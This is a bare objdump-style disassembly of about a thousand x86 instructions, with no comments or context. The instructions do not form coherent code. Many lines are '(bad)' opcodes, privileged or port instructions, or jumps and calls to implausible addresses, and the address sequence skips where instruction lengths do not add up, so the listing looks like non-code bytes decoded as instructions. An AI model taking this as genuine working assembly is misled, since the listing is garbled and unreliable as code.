  433a02:	mov    DWORD PTR [ebp-0x8],eax
  433a05:	jne    0x433a4c
  433a07:	jmp    0x433994
  433a09:	mov    ebp,DWORD PTR [eax]
  433a0b:	clc    
  433a0c:	retf   0xff51
  433a0f:	push   ecx
  433a10:	mov    DWORD PTR ds:0x757210,eax
  433a16:	mov    ecx,DWORD PTR [ebp-0x4]
  433a19:	sub    esp,DWORD PTR [ebx-0x77]
  433a1c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  433a23:	or     ah,bh
  433a25:	pop    es
  433a26:	ds cdq 
  433a28:	push   DWORD PTR [edx]
  433a2a:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  433a30:	(bad)  
  433a31:	mov    bh,bh
  433a33:	jmp    0x433a21
  433a35:	leave  
  433a36:	jne    0x433a40
  433a38:	call   0x303392
  433a3d:	in     al,dx
  433a3e:	dec    ebp
  433a3f:	add    dh,BYTE PTR [ebx]
  433a41:	add    BYTE PTR [ebx],al
  433a43:	inc    ebp
  433a44:	cmp    esi,DWORD PTR [esi]
  433a46:	je     0x4339e4
  433a48:	mov    eax,edi
  433a4a:	or     al,0xf0
  433a4c:	add    BYTE PTR [ebp+0x458bf845],al
  433a52:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  433a58:	adc    al,0x7
  433a5a:	enter  0x9fc0,0xa5
  433a5e:	rol    BYTE PTR [eax],0x5e
  433a61:	mov    ecx,ecx
  433a63:	or     al,0xc
  433a65:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  433a6c:	jmp    0x433a6d
  433a6e:	push   ebp
  433a6f:	mov    esp,ebp
  433a71:	cld    
  433a72:	inc    ebp
  433a73:	inc    ebp
  433a74:	or     DWORD PTR [ecx+0x457dec10],0x0
  433a7b:	push   esi
  433a7c:	push   esi
  433a7d:	mov    edi,0x7af080f
  433a82:	add    bh,al
  433a84:	test   DWORD PTR [ecx+0x3a7320f],ebx
  433a8a:	add    BYTE PTR [ecx+0x4540100f],cl
  433a90:	mov    ebp,eax
  433a92:	mov    ebp,edi
  433a94:	lock call edx
  433a97:	fcom   DWORD PTR [ebp+0x45]
  433a9a:	mov    eax,0x148a8b
  433a9f:	push   ecx
  433aa0:	enter  0xc145,0x83
  433aa4:	cmp    cl,BYTE PTR [eax]
  433aa6:	add    BYTE PTR [ebp+0x4d],al
  433aa9:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  433aaf:	call   0xffa3361e
  433ab4:	cmp    eax,DWORD PTR [ebp-0xc]
  433ab7:	jmp    DWORD PTR [eax+edx*1-0x4e]
  433abb:	push   ebp
  433abc:	(bad)
  433abf:	std    
  433ac0:	lock push DWORD PTR [edi+0x5d08fcdb]
  433ac7:	inc    ebp
  433ac8:	(bad)  
  433ac9:	call   0xff7d3759
  433ace:	add    al,BYTE PTR [ebp+0x37]
  433ad1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  433ad7:	jne    0x433ad9
  433ad9:	(bad)  
  433ada:	cmp    edi,esp
  433adc:	jne    0x433b0f
  433ade:	mov    edi,edi
  433ae0:	or     BYTE PTR [ebx-0x307f0b49],cl
  433ae6:	pop    ds
  433ae7:	into   
  433ae8:	je     0x433aab
  433aea:	mov    ebx,DWORD PTR [esi]
  433aec:	or     BYTE PTR [ebp-0x49],al
  433aef:	mov    esp,DWORD PTR [esi-0x77]
  433af2:	mov    esi,0xfe451f0c
  433af7:	mov    eax,DWORD PTR [eax]
  433af9:	or     al,0x66
  433afb:	sar    bl,0x3b
  433afe:	xor    esi,DWORD PTR [ebp+0x66]
  433b01:	xor    ecx,edi
  433b03:	pop    edi
  433b04:	adc    bl,BYTE PTR [ebx+0x7e]
  433b07:	ret    0xff
  433b0a:	cld    
  433b0b:	inc    ebp
  433b0c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433b12:	cld    
  433b13:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  433b1a:	push   0xffffff83
  433b1c:	pop    edi
  433b1d:	or     BYTE PTR [ebp+0x53],dh
  433b20:	xorps  xmm1,xmm2
  433b23:	test   BYTE PTR [eax+eax*1],bh
  433b26:	add    BYTE PTR [eax],al
  433b28:	adc    eax,eax
  433b2a:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  433b32:	jmp    DWORD PTR [eax]
  433b34:	ror    al,0x5e
  433b37:	inc    ebp
  433b38:	leave  
  433b39:	xor    ecx,DWORD PTR [eax]
  433b3b:	and    DWORD PTR [ebx-0x3ec70708],ecx
  433b41:	add    ch,al
  433b43:	xor    edi,edi
  433b45:	xor    DWORD PTR [ebx],0x660033fe
  433b4b:	mov    DWORD PTR [ebp-0xc],ecx
  433b4e:	pcmpgtw mm0,mm0
  433b51:	add    dl,ah
  433b53:	leave  
  433b54:	mov    edi,DWORD PTR [eax-0x7d]
  433b57:	push   ax
  433b59:	dec    ebp
  433b5a:	mov    esi,DWORD PTR [ebx-0x75]
  433b5d:	lea    ebp,[eax-0x7c00fffe]
  433b63:	xor    eax,DWORD PTR [eax]
  433b65:	sysret 
  433b67:	dec    ebp
  433b68:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  433b6f:	push   WORD PTR [ecx+0x8]
  433b73:	jne    0x433b36
  433b75:	ud0    ecx,DWORD PTR [ecx]
  433b78:	mov    edi,DWORD PTR [edx]
  433b7a:	lods   al,BYTE PTR ds:[esi]
  433b7b:	add    BYTE PTR [eax],al
  433b7d:	data16 (bad) 
  433b7f:	iret   
  433b80:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433b87:	cli    
  433b88:	inc    ebp
  433b89:	cmp    al,0x8d
  433b8b:	add    BYTE PTR [esi+0x2d],ah
  433b8e:	inc    ebp
  433b8f:	pop    ebp
  433b90:	lea    ecx,[edi]
  433b92:	mov    dl,bh
  433b94:	add    BYTE PTR [edi],cl
  433b96:	mov    DWORD PTR [eax+eax*8],edi
  433b99:	mov    ebx,0x3a87
  433b9e:	add    BYTE PTR [ebx],ch
  433ba0:	inc    ebp
  433ba1:	data16 (bad) 
  433ba3:	clc    
  433ba4:	int3   
  433ba5:	cmp    eax,DWORD PTR [eax]
  433ba7:	je     0x433b32
  433ba9:	push   0xffffffc8
  433bab:	pop    edi
  433bac:	xchg   DWORD PTR [ebp+0x0],eax
  433baf:	data16 add BYTE PTR [ebp+0x45],cl
  433bb3:	lea    cx,[ebp+0x10]
  433bb7:	jb     0x433bb9
  433bb9:	jmp    0x433b44
  433bbb:	call   eax
  433bbd:	clc    
  433bbe:	xchg   DWORD PTR [edi+0x1],edi
  433bc1:	mov    eax,DWORD PTR [eax]
  433bc3:	or     BYTE PTR [ebp-0x49],al
  433bc6:	lea    eax,[eax+0x74003154]
  433bcc:	push   edi
  433bcd:	inc    edx
  433bce:	jge    0x433bcf
  433bd0:	mov    DWORD PTR [edi],ecx
  433bd2:	fdiv   DWORD PTR [edi-0x6]
  433bd5:	inc    DWORD PTR [eax]
  433bd7:	xor    edx,DWORD PTR [eax+0x5f]
  433bda:	xchg   DWORD PTR [ebx+0x1],ebx
  433bdd:	ret    0x0
  433be0:	xor    BYTE PTR [ebp-0x51],cl
  433be3:	cmp    edi,0xf0ff8902
  433be9:	data16 ror al,0x84
  433bed:	rol    BYTE PTR [eax],0x3b
  433bf0:	add    al,dh
  433bf2:	dec    eax
  433bf3:	xchg   esp,eax
  433bf4:	push   ebx
  433bf5:	jmp    0x433b82
  433bf7:	push   ebp
  433bf8:	add    esp,ebp
  433bfa:	add    ebp,esp
  433bfc:	mov    edx,DWORD PTR [edi+0x24]
  433bff:	clc    
  433c00:	dec    esi
  433c01:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433c07:	cmp    BYTE PTR [ebx],al
  433c09:	jne    0x433b94
  433c0b:	xor    esp,eax
  433c0d:	jmp    0x463d90
  433c12:	add    ebp,DWORD PTR [ecx+ecx*4]
  433c15:	jne    0x433c0b
  433c17:	call   0xffcd3971
  433c1c:	clc    
  433c1d:	xchg   edi,eax
  433c1e:	sti    
  433c1f:	add    DWORD PTR [ebx],eax
  433c21:	add    BYTE PTR [ebp+0x47],bl
  433c24:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433c2a:	pop    ebp
  433c2b:	mov    DWORD PTR [esi-0x48],esi
  433c2e:	jmp    0x433c77
  433c30:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433c36:	(bad)  
  433c38:	cmp    al,0x0
  433c3a:	cmp    eax,DWORD PTR [ebp+0x18]
  433c3d:	lea    ebx,[ebp-0x56]
  433c40:	jle    0x433c42
  433c42:	jae    0x433bcd
  433c44:	mov    eax,esp
  433c46:	call   0xb900:0x8b005587
  433c4d:	inc    ebp
  433c4e:	push   ebp
  433c4f:	lea    ecx,[ebp-0x27ff4f12]
  433c55:	mov    eax,edi
  433c57:	int3   
  433c58:	push   ebp
  433c59:	xchg   edi,eax
  433c5b:	add    esp,ebp
  433c5d:	add    BYTE PTR [eax],al
  433c5f:	inc    ebp
  433c60:	add    BYTE PTR [ebp+0x8b3255],cl
  433c66:	cld    
  433c67:	mov    DWORD PTR [edx],edi
  433c69:	aam    0x75
  433c6b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433c71:	mov    DWORD PTR [ebx-0x50],edx
  433c74:	test   BYTE PTR [ebp-0x1],0xe8
  433c78:	mov    eax,DWORD PTR [eax]
  433c7a:	hlt    
  433c7b:	add    al,al
  433c7d:	mov    eax,DWORD PTR ds:0x890045a8
  433c83:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433c89:	inc    DWORD PTR [eax*2+0xf75854d]
  433c90:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433c96:	call   0x729999d7
  433c9b:	je     0x433cfb
  433c9d:	js     0x433cfe
  433c9f:	lock ret 0x7e
  433ca3:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433ca9:	mov    edi,edi
  433cab:	sbb    al,bl
  433cad:	clc    
  433cae:	add    BYTE PTR [ebp-0x73],bh
  433cb1:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433cb7:	ror    BYTE PTR [eax],1
  433cb9:	dec    ebp
  433cba:	xchg   ebp,eax
  433cbb:	mov    edi,edi
  433cbd:	in     al,0x8b
  433cbf:	jge    0x433c4a
  433cc1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433cc7:	clc    
  433cc8:	pop    esi
  433cc9:	fist   DWORD PTR [ebp+0x5d398b5d]
  433ccf:	clc    
  433cd0:	add    al,0x6e
  433cd2:	mov    eax,DWORD PTR [ebx]
  433cd4:	mov    BYTE PTR [ebp+0x0],dl
  433cd7:	mov    edx,DWORD PTR [ebx-0x20]
  433cda:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433ce0:	add    eax,0x3b3a73
  433ce5:	adc    al,0x89
  433ce7:	pop    eax
  433ce8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433cec:	ret    0xf08
  433cef:	cmp    al,0x2
  433cf1:	mov    DWORD PTR [edx],edi
  433cf3:	cld    
  433cf4:	add    BYTE PTR [ebp+0x66],dl
  433cf7:	add    eax,ebx
  433cf9:	add    esp,eax
  433cfb:	sub    eax,eax
  433cfd:	or     BYTE PTR [ecx-0x77f474bb],cl
  433d03:	add    BYTE PTR [eax],al
  433d05:	mov    DWORD PTR [ebx-0x24],ebx
  433d08:	push   edi
  433d09:	push   ebp
  433d0a:	clc    
  433d0b:	add    DWORD PTR [esi+0x1b0100],0x45
  433d12:	out    0xff,eax
  433d14:	add    edx,DWORD PTR [eax]
  433d16:	jmp    0x433d00
  433d18:	cmp    ch,0x44
  433d1b:	(bad)  
  433d1c:	jmp    0x40c8c56e
  433d21:	je     0x433cad
  433d23:	mov    eax,DWORD PTR [eax-0x10c78104]
  433d29:	inc    ebp
  433d2a:	add    BYTE PTR [ebx-0x770375],al
  433d30:	add    ah,ch
  433d32:	add    edx,esp
  433d34:	pop    edi
  433d35:	pop    ebp
  433d36:	push   ebp
  433d37:	inc    ebx
  433d38:	in     al,dx
  433d39:	pop    ebp
  433d3a:	in     al,dx
  433d3b:	cmp    edx,DWORD PTR [edi-0x8]
  433d3e:	ss xchg esp,eax
  433d40:	pushf  
  433d41:	pop    ebx
  433d42:	mov    ecx,ecx
  433d44:	call   0x8998844d
  433d49:	in     al,dx
  433d4a:	in     al,0x45
  433d4c:	dec    ebp
  433d4d:	push   esi
  433d4e:	test   DWORD PTR [eax+0xfb010f],esi
  433d54:	add    BYTE PTR [eax+0xc018b],dh
  433d5a:	leave  
  433d5b:	inc    ebp
  433d5c:	test   al,ch
  433d5e:	add    dh,bh
  433d60:	add    bh,bh
  433d62:	dec    ebp
  433d63:	push   cs
  433d64:	mov    DWORD PTR [ecx],eax
  433d66:	hlt    
  433d67:	push   es
  433d68:	dec    ebp
  433d69:	leave  
  433d6a:	mov    DWORD PTR [eax],ecx
  433d6c:	clc    
  433d6d:	cmovge eax,ecx
  433d70:	mov    ecx,0x85c2f0
  433d76:	clc    
  433d77:	pop    DWORD PTR [ebp+0x1]
  433d7a:	push   ebx
  433d7b:	add    BYTE PTR [ebp-0x15],bh
  433d7e:	push   esi
  433d7f:	xor    eax,0x898a45
  433d84:	cld    
  433d85:	inc    BYTE PTR [ebp+0x0]
  433d88:	cmp    BYTE PTR [esi-0x64],ah
  433d8b:	add    DWORD PTR [esi+0x78308c1],edi
  433d91:	add    ah,BYTE PTR [edi-0x49]
  433d94:	int    0xbb
  433d96:	mov    ecx,DWORD PTR [edi+0xc]
  433d99:	add    dh,al
  433d9b:	cmp    ecx,ebx
  433d9d:	jne    0x433d67
  433d9f:	xor    ecx,DWORD PTR [ebp+0x66]
  433da2:	jmp    0xca3da8
  433da7:	add    DWORD PTR [ebp+0x0],eax
  433daa:	mov    eax,ebx
  433dac:	or     al,0x8b
  433dae:	(bad)  
  433daf:	mov    ecx,esi
  433db1:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433db8:	mov    eax,edi
  433dba:	or     BYTE PTR [edx],cl
  433dbc:	shl    cl,cl
  433dbe:	icebp  
  433dbf:	add    BYTE PTR [ebp+0x3a],0x8b
  433dc3:	or     BYTE PTR [edx+eax*2],cl
  433dc6:	(bad)  
  433dc7:	or     cl,dh
  433dc9:	stc    
  433dca:	shl    DWORD PTR [ebp-0x30],0xc6
  433dce:	xor    al,0x0
  433dd0:	inc    ebp
  433dd1:	xchg   BYTE PTR [ebx],al
  433dd3:	add    esp,edi
  433dd5:	add    BYTE PTR [ebp-0x39],cl
  433dd8:	mov    al,bl
  433dda:	test   DWORD PTR [ebx+0x1c348375],ecx
  433de0:	sub    al,0xbf
  433de2:	jmp    0x433d69
  433de4:	mov    edi,eax
  433de6:	lock jge 0x433dda
  433de9:	lea    esi,[edx-0x74bad5fd]
  433def:	mov    ebp,esp
  433df1:	or     cl,dh
  433df3:	leave  
  433df4:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433dfb:	dec    ebp
  433dfc:	dec    ebp
  433dfd:	test   DWORD PTR [ebx],eax
  433dff:	paddb  mm6,mm0
  433e02:	add    DWORD PTR [eax],eax
  433e04:	dec    ebp
  433e05:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433e0b:	mov    esi,DWORD PTR [edx]
  433e0d:	or     al,0x2b
  433e0f:	dec    ebp
  433e10:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433e16:	mov    esp,edx
  433e18:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433e1f:	mov    DWORD PTR [ebx],ebp
  433e21:	call   0xc76c751
  433e26:	mov    DWORD PTR [ebp+0x10],ecx
  433e29:	(bad)  
  433e2a:	push   0x8b85ff10
  433e2f:	clc    
  433e30:	or     al,0x51
  433e32:	(bad)  
  433e33:	push   ecx
  433e34:	retf   
  433e35:	mov    ebx,0xff4d8dc8
  433e3a:	mov    DWORD PTR [ebp+0x8],eax
  433e3d:	xor    eax,DWORD PTR [ebp-0x75]
  433e40:	cmp    ebp,DWORD PTR [ebx]
  433e42:	lsl    ebx,WORD PTR [edi-0x8]
  433e46:	call   DWORD PTR [ebx-0x741bff75]
  433e4c:	(bad)  
  433e4d:	or     al,0x5b
  433e4f:	dec    ebp
  433e50:	or     BYTE PTR [ebx],dh
  433e52:	inc    ebp
  433e53:	xor    esi,DWORD PTR ds:0x708088d
  433e59:	in     eax,0x99
  433e5b:	add    BYTE PTR [edx],dh
  433e5d:	inc    ebp
  433e5e:	pop    edi
  433e5f:	xor    eax,edx
  433e61:	test   DWORD PTR [eax],0x81108b8b
  433e67:	dec    ebp
  433e68:	sub    al,0x33
  433e6a:	add    BYTE PTR [ebx],dh
  433e6c:	push   esi
  433e6d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433e73:	mov    edi,eax
  433e75:	or     BYTE PTR [ebp+0x45],al
  433e78:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433e7e:	ss leave 
  433e80:	pushf  
  433e81:	push   es
  433e82:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433e8a:	inc    ebp
  433e8b:	cmp    BYTE PTR [esi],0x51
  433e8e:	pushf  
  433e8f:	addr16 (bad) 
  433e91:	shl    esp,1
  433e93:	dec    ebp
  433e94:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433e9a:	(bad)  
  433e9b:	jmp    0x8c0b1177
  433ea0:	aam    0x8
  433ea2:	test   DWORD PTR [ebp-0x8],ecx
  433ea5:	mov    BYTE PTR [ebp-0x75],al
  433ea8:	or     BYTE PTR [eax],cl
  433eaa:	add    BYTE PTR [ebp-0x75],dl
  433ead:	mov    eax,0xfc728b
  433eb2:	dec    ebp
  433eb3:	enter  0xceba,0x8
  433eb7:	retf   0x1807
  433eba:	ret    0x994d
  433ebd:	mov    esi,DWORD PTR [edx]
  433ebf:	or     al,0x33
  433ec1:	into   
  433ec2:	add    edx,esi
  433ec4:	add    ecx,edx
  433ec6:	bswap  eax
  433ec8:	ror    esi,0x98
  433ecb:	dec    ebp
  433ecc:	add    cl,ch
  433ece:	mov    edi,edi
  433ed0:	hlt    
  433ed1:	inc    esi
  433ed3:	inc    ebp
  433ed4:	ret    0x4533
  433ed7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433edd:	or     BYTE PTR [ebx],dh
  433edf:	dec    ebp
  433ee0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433ee6:	jne    0xff8d3ead
  433eec:	inc    ebp
  433eed:	inc    ebp
  433eee:	mov    esi,DWORD PTR [ebx]
  433ef0:	clc    
  433ef1:	pop    esi
  433ef2:	ret    0xcaeb
  433ef5:	mov    eax,esi
  433ef7:	call   0x520490ca
  433efc:	dec    ebp
  433efd:	add    eax,0xf8728b
  433f02:	adc    eax,0xce0ccac9
  433f07:	push   ebp
  433f08:	ret    0xc6ec
  433f0b:	in     al,dx
  433f0c:	call   0x33438c15
  433f11:	push   edi
  433f12:	add    edi,eax
  433f14:	xor    eax,eax
  433f16:	jmp    0x433f5d
  433f18:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433f1e:	add    eax,edi
  433f20:	shr    eax,cl
  433f22:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433f28:	mov    edi,DWORD PTR [ecx]
  433f2a:	in     al,dx
  433f2b:	pushf  
  433f2c:	ret    0x84c7
  433f2f:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433f35:	inc    ebp
  433f36:	in     al,dx
  433f37:	ss inc ebp
  433f39:	pushf  
  433f3a:	mov    eax,edi
  433f3c:	cld    
  433f3d:	fmul   st(2),st
  433f3f:	sbb    dl,al
  433f41:	jmp    0x9c3b:0x374d45c1
  433f48:	jbe    0x433f11
  433f4a:	mov    esp,eax
  433f4c:	clc    
  433f4d:	add    BYTE PTR [ebp+0x0],cl
  433f50:	mov    ecx,ecx
  433f52:	lea    eax,[ebp-0x5]
  433f55:	mov    edi,edi
  433f57:	call   0x51ce90a1
  433f5c:	hlt    
  433f5d:	xor    eax,edx
  433f5f:	mov    esi,0x997284
  433f64:	xor    cl,dl
  433f66:	mov    esi,eax
  433f68:	hlt    
  433f69:	into   
  433f6a:	inc    ebp
  433f6b:	scas   eax,DWORD PTR es:[edi]
  433f6c:	mov    ebp,ecx
  433f6e:	cld    
  433f6f:	add    dl,cl
  433f71:	add    dl,al
  433f73:	inc    ebp
  433f74:	shr    DWORD PTR [ebx],0x4d
  433f77:	xor    edi,DWORD PTR [ebx]
  433f79:	mov    DWORD PTR [edi],ecx
  433f7b:	clc    
  433f7c:	dec    esi
  433f7d:	inc    ebp
  433f7e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433f84:	ret    0xc6ca
  433f87:	mov    BYTE PTR [ebp-0x32],0x53
  433f8b:	scas   eax,DWORD PTR es:[edi]
  433f8c:	inc    ebp
  433f8d:	jmp    0x433fc6
  433f8f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433f96:	pop    ebx
  433f97:	xor    ecx,DWORD PTR [ebp+0x3]
  433f9a:	mov    eax,DWORD PTR [ebx]
  433f9c:	clc    
  433f9d:	test   edx,ecx
  433f9f:	mov    ecx,esi
  433fa1:	cld    
  433fa2:	call   0x8ab784ec
  433fa7:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433fad:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433fb3:	fdiv   QWORD PTR [ebx]
  433fb5:	retf   0xce89
  433fb8:	in     al,0xc1
  433fba:	inc    ebp
  433fbb:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433fc1:	into   
  433fc2:	mov    dh,0xc1
  433fc5:	call   0x8c17854e
  433fca:	(bad)  
  433fcb:	cld    
  433fcc:	mov    ecx,DWORD PTR [ebp-0x14]
  433fcf:	xor    eax,ecx
  433fd1:	lea    eax,[ebp+0x8]
  433fd4:	mov    esi,DWORD PTR [edx-0x4]
  433fd7:	add    dl,al
  433fd9:	inc    ebp
  433fda:	mov    esp,0x32d8998b
  433fdf:	dec    ebp
  433fe0:	mov    esi,DWORD PTR [ebx]
  433fe2:	cld    
  433fe3:	xor    eax,edx
  433fe5:	sub    esp,DWORD PTR [edi-0x75]
  433fe8:	int    0xec
  433fea:	sub    ecx,eax
  433fec:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433ff2:	mov    esi,esp
  433ff4:	call   0x34178d7d
  433ff9:	inc    DWORD PTR [ebx]
  433ffb:	mov    edi,DWORD PTR [ebx]
  433ffd:	cld    
  433ffe:	jne    0x43404d
  434000:	mov    esi,DWORD PTR [ebx]
  434002:	aam    0x8d
  434004:	dec    ebp
  434005:	or     BYTE PTR [ebx],dh
  434007:	jb     0x43400c
  434009:	add    BYTE PTR [edi+0x45],bl
  43400c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  434013:	xor    ebp,esp
  434015:	xor    eax,edi
  434017:	sub    edi,esp
  434019:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  43401f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  434026:	inc    ebp
  434027:	xor    ecx,DWORD PTR [ecx+0x45891403]
  43402d:	clc    
  43402e:	mov    eax,edi
  434030:	nop
  434031:	fadd   QWORD PTR [eax]
  434033:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  434039:	jmp    0x433fc4
  43403b:	mov    eax,DWORD PTR [ecx]
  43403d:	fadd   DWORD PTR [eax]
  43403f:	inc    ebp
  434040:	or     DWORD PTR [ebx],esi
  434042:	dec    eax
  434043:	add    edx,DWORD PTR [ebx-0x2d]
  434046:	dec    ebp
  434047:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  43404d:	inc    ebp
  43404e:	push   ecx
  43404f:	mov    dl,BYTE PTR [ecx-0xd]
  434052:	xor    ecx,DWORD PTR [ebp-0x45]
  434055:	(bad)  
  434057:	rol    BYTE PTR [eax],0xc1
  43405a:	ret    
  43405b:	inc    ebp
  43405c:	inc    ebp
  43405d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  434063:	xor    eax,ebx
  434065:	add    eax,DWORD PTR [ebp+0x23]
  434068:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43406e:	cmp    edi,0xc
  434071:	dec    ebp
  434072:	inc    ebp
  434073:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  434079:	inc    ebp
  43407a:	mov    esi,DWORD PTR [ebx]
  43407c:	clc    
  43407d:	lea    eax,[ebp+0x45725407]
  434083:	add    BYTE PTR [ebp+eax*2-0x75],dh
  434087:	xor    edi,DWORD PTR [eax]
  434089:	mov    ecx,0xff8b8d4d
  43408e:	push   esp
  43408f:	enter  0x4df7,0x23
  434093:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  434099:	mov    eax,DWORD PTR [ebx]
  43409b:	loopne 0x434088
  43409d:	ret    0xc68b
  4340a0:	push   esp
  4340a1:	enter  0x9745,0x8b
  4340a5:	inc    ebp
  4340a6:	cld    
  4340a7:	mov    eax,edi
  4340a9:	clc    
  4340aa:	ret    
  4340ab:	ret    0xc645
  4340ae:	mov    esi,DWORD PTR [ebx]
  4340b0:	cld    
  4340b1:	pop    esi
  4340b2:	mov    ebx,0x83458bc3
  4340b8:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4340bc:	dec    ebp
  4340bd:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  4340c5:	clc    
  4340c6:	fcom   DWORD PTR [ebp+0x45]
  4340c9:	mov    edi,DWORD PTR [eax]
  4340cb:	adc    al,0x9c
  4340cd:	inc    ebp
  4340ce:	(bad)  
  4340cf:	mov    ebx,eax
  4340d1:	adc    al,0x85
  4340d3:	cmp    al,0x1
  4340d6:	inc    ebp
  4340d7:	add    BYTE PTR [edx],bh
  4340d9:	dec    ebp
  4340da:	pushf  
  4340db:	mov    ebp,ecx
  4340dd:	mov    eax,DWORD PTR [ebx]
  4340df:	nop
  4340e0:	add    BYTE PTR [eax],al
  4340e2:	inc    ebp
  4340e3:	mov    esi,DWORD PTR [ebx]
  4340e5:	add    eax,DWORD PTR [ebx]
  4340e7:	cmp    al,0x89
  4340e9:	mov    esp,esi
  4340eb:	clc    
  4340ec:	inc    ebp
  4340ed:	inc    ebp
  4340ee:	add    edx,DWORD PTR [esi+0xc]
  4340f1:	mov    edi,0x7ff0845
  4340f6:	in     al,dx
  4340f7:	(bad)  
  4340f8:	jne    0x434093
  4340fa:	mov    esi,DWORD PTR [edx]
  4340fc:	clc    
  4340fd:	add    ebp,DWORD PTR [esi]
  4340ff:	mov    edi,edi
  434101:	in     al,dx
  434102:	mov    DWORD PTR [ebp-0x10],eax
  434105:	xor    eax,DWORD PTR [ebp+0x3]
  434108:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  434110:	(bad)  
  434111:	push   eax
  434112:	ret    
  434113:	call   0xd4ffcaa5
  434118:	call   0xffcf3962
  43411d:	cmp    BYTE PTR [ebp+0x4d],al
  434120:	test   DWORD PTR [eax+0x74],ecx
  434123:	inc    ecx
  434124:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43412a:	ret    
  43412b:	inc    eax
  43412c:	dec    DWORD PTR [ebx+0x4945f8f0]
  434132:	push   eax
  434133:	dec    eax
  434134:	test   al,0xd0
  434136:	dec    eax
  434138:	mov    eax,DWORD PTR [ebp-0x14]
  43413b:	mov    eax,DWORD PTR [ebp+0x38]
  43413e:	mov    eax,ecx
  434140:	fadd   DWORD PTR [ebx]
  434142:	dec    ebp
  434143:	inc    eax
  434144:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43414a:	inc    ebp
  43414b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  434151:	fadd   QWORD PTR [ebx]
  434153:	inc    ebp
  434154:	or     al,0x33
  434156:	dec    ebp
  434157:	add    edi,DWORD PTR [ebx]
  434159:	mov    DWORD PTR [edx-0x28],esi
  43415c:	mov    eax,DWORD PTR [ebp-0x10]
  43415f:	mov    eax,DWORD PTR [eax+0x10]
  434162:	mov    eax,edi
  434164:	lock ret 
  434166:	inc    ecx
  434167:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43416d:	fsubr  st,st(5)
  43416f:	test   DWORD PTR [eax],eax
  434171:	clc    
  434172:	push   0x45
  434174:	(bad)  
  434175:	cmp    ebp,esp
  434177:	pushf  
  434178:	inc    ebp
  434179:	(bad)  
  43417a:	push   eax
  43417b:	fsub   DWORD PTR [eax-0x7b]
  43417e:	(bad)  
  43417f:	clc    
  434180:	mov    eax,0xf8008584
  434185:	mov    eax,DWORD PTR [ebp-0x4]
  434188:	mov    edi,0x4585c3cc
  43418e:	clc    
  43418f:	mov    eax,DWORD PTR [ebp+0x14]
  434192:	cmp    BYTE PTR [ebp-0x64],al
  434195:	mov    edi,eax
  434197:	in     al,dx
  434198:	les    esi,FWORD PTR [ebp-0x7b]
  43419b:	mov    edi,eax
  43419d:	or     al,0x4d
  43419f:	dec    ebp
  4341a0:	mov    eax,ebp
  4341a2:	in     al,0xf2
  4341a4:	dec    ebp
  4341a5:	dec    DWORD PTR [ecx+0x4dc7e045]
  4341ab:	fmul   DWORD PTR [ecx+0x4df8f085]
  4341b1:	inc    ebp
  4341b2:	mov    DWORD PTR [ebx],esi
  4341b4:	fadd   QWORD PTR [ebx]
  4341b6:	dec    ebp
  4341b7:	push   eax
  4341b8:	xor    eax,DWORD PTR [ebp+0x3]
  4341bb:	push   eax
  4341bc:	mov    DWORD PTR [eax+ebx*8],ebx
  4341bf:	push   esi
  4341c1:	mov    eax,DWORD PTR [eax]
  4341c3:	lock cmp eax,0xf84e85c0
  4341c9:	inc    ebp
  4341ca:	test   BYTE PTR [ebx],dh
  4341cc:	add    DWORD PTR [ebx],eax
